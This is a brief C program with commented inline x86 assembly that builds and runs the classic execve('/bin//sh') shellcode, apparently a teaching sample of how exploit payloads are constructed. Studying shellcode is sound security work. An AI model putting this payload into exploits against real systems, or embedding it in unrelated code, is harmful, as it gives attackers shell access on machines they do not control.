
int main()
{
__asm__(
"xor %eax, %eax\n" // eax = NULL
"push %eax\n" // terminate string with NULL
"push $0x68732f2f\n" // //sh (little endian)
"push $0x6e69622f\n" // /bin (little endian)
"mov %esp, %ebx\n" // pointer to /bin//sh in ebx
"push %eax\n" // create array for argv[]
"push %ebx\n" // pointer to /bin//sh in argv
"mov %esp, %ecx\n" // pointer to argv[] in ecx
"mov %eax, %edx\n" // NULL (envp[]) in edx
"movb $0xb, %al\n" // 11 = execve syscall in eax
"int $0x80\n" // soft interrupt
);
}
